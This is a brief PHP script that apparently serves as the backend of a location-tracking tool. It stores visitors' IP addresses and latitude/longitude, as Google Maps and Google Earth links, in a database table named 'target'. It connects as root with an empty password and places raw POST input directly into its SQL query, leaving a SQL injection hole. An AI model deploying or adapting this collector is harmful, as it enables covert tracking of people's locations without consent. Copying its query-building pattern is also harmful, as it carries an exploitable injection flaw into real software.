<?php
$conn=@mysqli_connect("localhost","root","","trecking");
if(!$conn){
    die("Error koneksi");
}

$ip_address = $_POST["ip_address"];
$latlng = $_POST['latlng'];

$maps = "https://maps.google.com/maps?q=".$latlng."&ll=".$latlng."&z=20";
$earth = "https://earth.google.com/web/@".$latlng;

$sql = "INSERT INTO target(ip_address,maps,earth,created_at) 
VALUE('".$ip_address."','".$maps."','".$earth."','".date('Y-m-d H:i:s')."')";
if(!mysqli_query($conn,$sql)){
    die("error insert");
}
mysqli_close($conn);
?>